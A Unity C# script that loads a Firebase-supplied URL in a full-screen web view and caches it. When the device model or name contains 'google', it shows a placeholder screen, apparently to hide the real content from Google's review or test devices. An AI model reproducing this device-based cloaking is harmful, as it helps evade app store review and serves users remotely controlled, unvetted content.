using System;
using System.IO;
using Firebase;
using UnityEngine;

public class MainLogic : MonoBehaviour
{
    private DataManager<WebViewURL> _dataManager;
    private string _jsonUrlPath;
    private WebViewURL _webViewURL;

    [SerializeField] private FirebaseManager _firebaseManager;
    [SerializeField] private UniWebView _customWebView;
    
    [SerializeField] private GameObject _plugScreen;
    [SerializeField] private GameObject _noInternetScreen;
    [SerializeField] private GameObject _webViewScreen;
    [SerializeField] private GameObject _loadingScreen;
    private async void Start()
    {
        _jsonUrlPath = Path.Combine(Application.persistentDataPath, "WebViewURL.json");
        _dataManager = new DataManager<WebViewURL>();
        _webViewURL = new WebViewURL();
        
        _firebaseManager.OnConnectionError += SetNoInternetScreen;
        
        if (!File.Exists(_jsonUrlPath))
        {
            await _firebaseManager.FetchDataAsync();
            var configValue = await _firebaseManager.ConnectToFirebaseConfig("url");
            Debug.Log(configValue.StringValue);
            if(configValue.StringValue == "" || SystemInfo.deviceModel.ToLower().Contains("google") ||
               SystemInfo.deviceName.ToLower().Contains("google"))
            {
                _loadingScreen.SetActive(false);
                _plugScreen.SetActive(true);
                return;
            }
            if(configValue.StringValue != String.Empty)
            {
                _webViewURL.value = configValue.StringValue;
                _dataManager.SaveToJson(_webViewURL, _jsonUrlPath);
                
                _loadingScreen.SetActive(false);
                _webViewScreen.SetActive(true);
                _customWebView.Frame = new Rect(0, 0, Screen.width, Screen.height);
                _customWebView.Load(_webViewURL.value);
                _customWebView.Show();
            }
        }
        else
        {
            _webViewURL = _dataManager.LoadFromJson(_jsonUrlPath);
            _loadingScreen.SetActive(false);
            CheckForInternetConnection();
        }
    }
    
    private void CheckForInternetConnection()
    {
        if(Application.internetReachability == NetworkReachability.NotReachable)
        {
            _noInternetScreen.SetActive(true);
            Debug.Log("Error. Check internet connection!");
        }
        else
        {
            _webViewScreen.SetActive(true);
            _customWebView.Frame = new Rect(0, 0, Screen.width, Screen.height);
            _customWebView.Load(_webViewURL.value);
            _customWebView.Show();
        }
    }

    private void SetNoInternetScreen()
    {
        _loadingScreen.SetActive(false);
        _webViewScreen.SetActive(false);
        _plugScreen.SetActive(false);
        _noInternetScreen.SetActive(true);
    }
    
}

[Serializable]
public class WebViewURL
{
    public string value;
}
